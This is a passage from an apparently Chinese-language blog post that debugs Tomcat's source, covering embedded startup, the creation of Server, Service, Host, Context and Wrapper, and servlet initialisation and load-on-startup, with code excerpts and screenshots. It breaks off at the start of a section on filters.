</span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.memshell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleException;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.startup.Tomcat;  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> LifecycleException &#123;  </span><br><span class="line">        <span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();  </span><br><span class="line">        tomcat.getConnector(); <span class="comment">//tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603  </span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>).getAbsolutePath());  </span><br><span class="line">        Tomcat.addServlet(context, <span class="string">&quot;helloServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServlet</span>());  </span><br><span class="line">        context.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;helloServlet&quot;</span>);  </span><br><span class="line">        tomcat.start();  </span><br><span class="line">        tomcat.getServer().await();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HelloServlet.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.memshell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html&quot;</span>);  </span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();  </span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);  </span><br><span class="line">        out.println(<span class="string">&quot;Hello, World!&quot;</span>);  </span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了便于调试, 这里使用的是&#x3D;&#x3D;嵌入式的tomcat&#x3D;&#x3D;, 启动方式有所不同<br>嵌入式的启动是使用&#x3D;&#x3D;<code>org.apache.catalina.startup.Tomcat</code>&#x3D;&#x3D;类的一个简易启动, 而传统的启动则使用&#x3D;&#x3D;Catalina&#x3D;&#x3D;配合&#x3D;&#x3D;Bootstrap&#x3D;&#x3D;来完成启动的</p><ul><li><p><strong>嵌入式 Tomcat 启动：</strong> 使用 <code>Tomcat</code> 类的一个<strong>简易启动</strong>方式。</p><ul><li><code>Tomcat</code> 类作为高层 API，封装了底层 Catalina 组件的创建和配置细节，让开发者可以通过编程方式快速启动一个 Tomcat 实例。它在内部会隐式地创建和组装 <code>Server</code>、<code>Service</code>、<code>Engine</code>、<code>Host</code> 等核心组件。</li></ul></li><li><p><strong>传统 Tomcat 启动：</strong> 使用 <code>Catalina</code> 配合 <code>Bootstrap</code>。</p><ul><li><p><code>Bootstrap</code> 是<strong>引导程序</strong>，负责环境准备、类加载器设置，并调用 <code>Catalina</code> 的核心方法。</p></li><li><p><code>Catalina</code> 是<strong>核心容器的管理者</strong>，它根据 <code>server.xml</code> 等配置文件来解析、创建和协调 <code>Server</code>、<code>Service</code>、<code>Engine</code>、<code>Host</code> 等所有核心容器组件的生命周期。</p></li></ul></li></ul><p>先来看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();  </span><br><span class="line">tomcat.getConnector();</span><br></pre></td></tr></table></figure><p>创建tomcat建议启动器实例, 获取Connector, 跟进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722160040.png" alt="image.png"><br>这里getService跟进去是这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Service <span class="title function_">getService</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> getServer().findServices()[<span class="number">0</span>];  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getServer跟进去是这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Server <span class="title function_">getServer</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (server != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> server;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    System.setProperty(<span class="string">&quot;catalina.useNaming&quot;</span>, <span class="string">&quot;false&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    server = <span class="keyword">new</span> <span class="title class_">StandardServer</span>();  </span><br><span class="line">  </span><br><span class="line">    initBaseDir();  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Set configuration source  </span></span><br><span class="line">    ConfigFileLoader.setSource(<span class="keyword">new</span> <span class="title class_">CatalinaBaseConfigurationSource</span>(<span class="keyword">new</span> <span class="title class_">File</span>(basedir), <span class="literal">null</span>));  </span><br><span class="line">  </span><br><span class="line">    server.setPort( -<span class="number">1</span> );  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Service</span> <span class="variable">service</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardService</span>();  </span><br><span class="line">    service.setName(<span class="string">&quot;Tomcat&quot;</span>);  </span><br><span class="line">    server.addService(service);  </span><br><span class="line">    <span class="keyword">return</span> server;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以最终是<code>getServer</code>方法创建了一个<code>StandardServer</code>, 并实例化一个<code>StandardService</code>添加到创建的<code>StandardServer</code>中</p><p>之后创建一个连接器, 添加给service,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722160530.png" alt="image.png"><br>也就是说是<code>tomcat.getConnector();</code>这句创建了&#x3D;&#x3D;Server&#x3D;&#x3D;和&#x3D;&#x3D;service&#x3D;&#x3D;以及service中的&#x3D;&#x3D;连接器&#x3D;&#x3D;</p><p>继续看下一句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>).getAbsolutePath());</span><br></pre></td></tr></table></figure><p>断点进到<code>addWebapp</code>中去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722163236.png" alt="image.png"></p><p>可以跟进<code>getHost</code>方法, 这里和之前的逻辑一样, 有则返回, 无则创建</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Host <span class="title function_">getHost</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">Engine</span> <span class="variable">engine</span> <span class="operator">=</span> getEngine();  </span><br><span class="line">    <span class="keyword">if</span> (engine.findChildren().length &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> (Host) engine.findChildren()[<span class="number">0</span>];  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardHost</span>();  </span><br><span class="line">    host.setName(hostname);  </span><br><span class="line">    getEngine().addChild(host);  </span><br><span class="line">    <span class="keyword">return</span> host;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显这里是创建了<code>engine</code>并为其创建了一个<code>host</code>, 这个host默认绑定在<code>localhost</code>, 并将该host作为<code>engine</code>的child, 这也就是组合模式的运用</p><p>跟进addWebapp<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722164542.png" alt="image.png"><br>创建了一个<code>LifecycleListener</code>, 是一个空的ContextConfig<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722165419.png" alt="image.png"></p><p>再跟进addWebapp<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722171149.png" alt="image.png"></p><p>为host创建了一个context, 并配置了该context的默认监听器 (观察者)<br>在此时候context也就创建好了</p><p>之后看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tomcat.addServlet(context, <span class="string">&quot;helloServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServlet</span>());  </span><br><span class="line">context.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;helloServlet&quot;</span>);</span><br></pre></td></tr></table></figure><p>首先是<code>addServlet</code>为现有的context创建了一个wrapper<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722171955.png" alt="image.png"></p><p>addServletMappingDecoded 添加了映射<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722172913.png" alt="image.png"></p><p>到这里该创建的都创建了<br>之后就会进入到init和start的流程, 和上面的泳道图中的流程基本一致</p><p>有一点不同在于下图中的过程<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722223729.png" alt="image.png"></p><p>在调试时发现这里应该是先执行&#x3D;&#x3D;<code>DefaultWebXmlListener</code>&#x3D;&#x3D;监听器<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722230011.png" alt="image.png"></p><p>这个监听器是<code>org.apache.catalina.startup.Tomcat</code>里定义的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722230133.png" alt="image.png"><br>看注释可以知道这个监听器是用来代替传统启动方式的<code>$CATALINA_HOME/conf/web.xml</code>配置启动的, 这样就相当于它代替了<code>org.apache.catalina.startup.ContextConfig</code>这个监听器的任务, 再来看<code>ContextConfig</code>监听器, 它的<code>defaultWebXml</code>被赋值为了<code>org/apache/catalina/startup/NO_DEFAULT_XML</code>(即不采用默认xml配置文件) 也证实了这一点</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722230643.png" alt="image.png"></p><p>跟进<code>DefaultWebXmlListener</code>监听器<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722231231.png" alt="image.png"><br>addServlet创建servlet对应的wrapper后, 将其添加到context<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722231304.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722232232.png" alt="image.png"></p><p>最后会启动这个wrapper<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722232056.png" alt="image.png"></p><p>再看ContextConfig监听器<br>可以在此处打条件断点进去<br><code>listener.getClass().getName().equals(&quot;org.apache.catalina.startup.ContextConfig&quot;)</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722235322.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722235356.png" alt="image.png"><br>如果是传统的配置文件启动, 会进入<code>configureStart();</code>, 这里并不是就不会进去. </p><h3 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h3><h4 id="servlet初始化流程分析"><a href="#servlet初始化流程分析" class="headerlink" title="servlet初始化流程分析"></a>servlet初始化流程分析</h4><p>断点打在<code>org.apache.catalina.core.StandardWrapper#setServletClass</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723002635.png" alt="image.png"></p><p>根据上面的调试StandardWrapper#setServletClass的上层调用有两种情况<br>一种是<code>DefaultWebXmlListener</code> , 一种是<code>ContextConfig</code><br>先来看<code>DefaultWebXmlListener</code><br>它会触发到<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722231304.png" alt="image.png"></p><p>这里可以看见关键的三步</p><ul><li><p>&#x3D;&#x3D;创建servlet&#x3D;&#x3D;(<code>addServlet</code>)</p></li><li><p>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值</p></li><li><p>将<code>url</code>和<code>servlet</code>类做映射<br>再看创建Servlet的逻辑<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722232232.png" alt="image.png"><br>创建Servlet又分为</p></li><li><p>创建<code>Wapper</code>对象</p></li><li><p>设置<code>Wapper</code>中<code>Servlet</code>的<code>class</code></p></li><li><p>设置<code>Wapper</code>中<code>Servlet</code>的名称</p></li><li><p>将配置好的<code>Wrapper</code>添加到<code>Context</code>中<br>因此初始化Servlet分为</p></li><li><p>创建<code>Wapper</code>对象</p></li><li><p>设置<code>Wapper</code>中<code>Servlet</code>的<code>class</code></p></li><li><p>设置<code>Wapper</code>中<code>Servlet</code>的名称</p></li><li><p>将配置好的<code>Wrapper</code>添加到<code>Context</code>中</p></li><li><p>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值</p></li><li><p>将<code>url</code>和<code>servlet</code>类做映射</p></li></ul><p><strong>再来看<code>ContextConfig</code></strong><br>在configureContext方法中同样会调用到<code>wrapper.setServletClass(servlet.getServletClass());</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;  </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();  </span><br><span class="line">    <span class="comment">// Description is ignored  </span></span><br><span class="line">    <span class="comment">// Display name is ignored    // Icons are ignored  </span></span><br><span class="line">    <span class="comment">// jsp-file gets passed to the JSP Servlet as an init-param  </span></span><br><span class="line">    <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;  </span><br><span class="line">        wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;  </span><br><span class="line">        wrapper.setEnabled(servlet.getEnabled().booleanValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setName(servlet.getServletName());  </span><br><span class="line">    Map&lt;String,String&gt; params = servlet.getParameterMap();  </span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;  </span><br><span class="line">        wrapper.addInitParameter(entry.getKey(), entry.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setRunAs(servlet.getRunAs());  </span><br><span class="line">    Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();  </span><br><span class="line">    <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;  </span><br><span class="line">        wrapper.addSecurityReference(  </span><br><span class="line">                roleRef.getName(), roleRef.getLink());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setServletClass(servlet.getServletClass());  </span><br><span class="line">    <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();  </span><br><span class="line">    <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1</span>;  </span><br><span class="line">        <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;  </span><br><span class="line">            maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;  </span><br><span class="line">            maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;  </span><br><span class="line">            fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(  </span><br><span class="line">                multipartdef.getLocation(),  </span><br><span class="line">                maxFileSize,  </span><br><span class="line">                maxRequestSize,  </span><br><span class="line">                fileSizeThreshold));  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;  </span><br><span class="line">        wrapper.setAsyncSupported(  </span><br><span class="line">                servlet.getAsyncSupported().booleanValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setOverridable(servlet.isOverridable());  </span><br><span class="line">    context.addChild(wrapper);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">for</span> (Entry&lt;String, String&gt; entry :  </span><br><span class="line">        webxml.getServletMappings().entrySet()) &#123;  </span><br><span class="line">    context.addServletMappingDecoded(entry.getKey(), entry.getValue());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是完成了上面6个步骤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">...</span><br><span class="line">wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">...</span><br><span class="line">wrapper.setName(servlet.getServletName());</span><br><span class="line">...</span><br><span class="line">wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">...</span><br><span class="line">context.addChild(wrapper);</span><br><span class="line">...</span><br><span class="line">context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="servlet装载流程分析"><a href="#servlet装载流程分析" class="headerlink" title="servlet装载流程分析"></a>servlet装载流程分析</h4><p>断点在<code>org.apache.catalina.core.StandardWrapper#loadServlet</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723154556.png" alt="image.png"><br>寻找其上层调用<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723155407.png" alt="image.png"><br>这里注释写的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// Load and initialize all &quot;load on startup&quot; servlets</span><br></pre></td></tr></table></figure><p>说明是启动所有标记为<code>LoadOnStartUp</code>d的servlet</p><p>并且在此之前执行了<br><code>listenerStart()</code> 和 <code>filterStart()</code> 启动listener和filter<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723155708.png" alt="image.png"></p><p>再看loadOnStartup方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized  </span></span><br><span class="line">    TreeMap&lt;Integer,ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();  </span><br><span class="line">    <span class="keyword">for</span> (Container child : children) &#123;  </span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();  </span><br><span class="line">        <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">            <span class="keyword">continue</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);  </span><br><span class="line">        map.computeIfAbsent(key, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(wrapper);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Load the collected &quot;load on startup&quot; servlets  </span></span><br><span class="line">    <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (Wrapper wrapper : list) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                wrapper.load();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException e) &#123;  </span><br><span class="line">                getLogger().error(  </span><br><span class="line">                        sm.getString(<span class="string">&quot;standardContext.loadOnStartup.loadException&quot;</span>, getName(), wrapper.getName()),  </span><br><span class="line">                        StandardWrapper.getRootCause(e));  </span><br><span class="line">                <span class="comment">// <span class="doctag">NOTE:</span> load errors (including a servlet that throws  </span></span><br><span class="line">                <span class="comment">// UnavailableException from the init() method) are NOT                </span></span><br><span class="line">                <span class="comment">// fatal to application startup                </span></span><br><span class="line">                <span class="comment">// unless failCtxIfServletStartFails=&quot;true&quot; is specified</span></span><br><span class="line">                <span class="keyword">if</span> (getComputedFailCtxIfServletStartFails()) &#123;  </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>loadOnStartup</code> &lt; 0 就不加载(只有访问到时才加载)<br>将loadOnStartup &gt;&#x3D; 0 的创建一个treeMap, treeMap的键为loadOnStartup的值, reeMap的值 为ArrayList, 里面存储需要加载的Wrapper(Servlet)<br>之后遍历整个treeMap加载</p><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723214431.png" alt="image.png"></p><h4 id="tomcat源码调试"><a href="#tomcat源码调试" class="headerlink" title="tomcat源码调试"></a>tomcat源码调试</h4><p>这里使用传统方式启动tomcat而不是嵌入式,<br>要调试这个非嵌入式的tomcat, 网上很多教程都很繁琐且不太靠谱,<br>可以直接添加嵌入式tomcat的源码来调试, 版本保持一致即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  